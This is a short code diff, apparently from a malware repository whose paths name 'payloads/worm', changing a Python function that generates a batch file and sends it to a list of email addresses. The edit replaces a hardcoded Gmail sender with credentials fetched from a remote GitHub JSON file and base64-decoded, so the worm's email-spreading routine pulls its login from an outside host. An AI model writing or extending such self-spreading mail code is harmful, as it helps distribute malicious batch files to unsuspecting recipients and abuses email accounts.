@@ -160,10 +160,12 @@ def generate():
     return bat_path
 
 def send_a(bat_path, emails):
-    email_user = "defalttests@gmail.com"
     try:
-        r = requests.get("https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/finde/secret")
-        email_pass = base64.b64decode(r.content).decode()
+        r = requests.get("https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/worm/secret.json")
+        json_data = json.loads(r.text.strip())
+        email_user = json_data["email"]
+        encoded_pass = json_data["password"]
+        email_pass = base64.b64decode(encoded_pass).decode()
     except: return
 
     with open(bat_path, 'rb') as f:
